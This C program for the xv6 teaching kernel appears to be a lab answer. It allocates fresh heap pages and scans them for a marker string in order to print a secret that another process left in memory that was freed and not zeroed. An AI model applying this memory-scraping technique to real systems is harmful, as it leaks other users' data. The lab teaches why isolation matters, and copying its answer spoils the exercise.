#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define DATASIZE (8*4096)

int
main(int argc, char *argv[])
{
  int n = 32 * 4096; // grab plenty of pages
  char *mem = sbrk(n);

  char *marker = "This may help.";
  int mlen = strlen(marker);

  for (int i = 0; i < n - mlen - 1; i++) {
    if (memcmp(mem + i, marker, mlen) == 0) {
      char *secret = mem + i + 16;
      printf("%s\n", secret);
    }
  }

  exit(0);
}


